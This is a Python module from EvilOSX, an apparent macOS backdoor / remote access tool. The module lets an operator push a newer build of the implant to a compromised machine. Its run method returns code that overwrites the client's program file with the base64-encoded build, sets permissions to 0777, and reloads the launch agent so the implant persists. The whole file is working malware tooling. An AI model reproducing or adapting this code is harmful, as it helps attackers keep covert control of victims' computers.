import os
import base64


class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Updates the client to a newer version of EvilOSX.",
            "References": [],
            "Task": False
        }
        self.new_file = None

    def setup(self, module_view, output_view, successful):
        file_location = os.path.expanduser(module_view.prompt("Path to the built EvilOSX: "))

        if not os.path.exists(file_location):
            output_view.add("File doesn't exist!", "attention")
            successful.put(False)
        else:
            module_view.add("You are about to update the client using the file: " + file_location, "attention")
            confirm = module_view.prompt("Are you sure you want to continue? [Y/n] ").lower()

            if not confirm or confirm == "y":
                with open(file_location, "r") as input_file:
                    self.new_file = base64.b64encode("".join(input_file.readlines()))

                output_view.add("Removing client...", "info")
                successful.put(True)
            else:
                output_view.add("Cancelled", "info")
                successful.put(False)

    def run(self):
        return """\
        import base64
                        
        with open(get_program_file(), "w") as output_file:            
            output_file.write(base64.b64decode("%s"))
        os.chmod(get_program_file(), 0777)  # Important!
            
        # Reload the launch agent.
        run_command("launchctl stop " + LAUNCH_AGENT_NAME + " && launchctl load -w " + get_launch_agent_file())
        """ % self.new_file
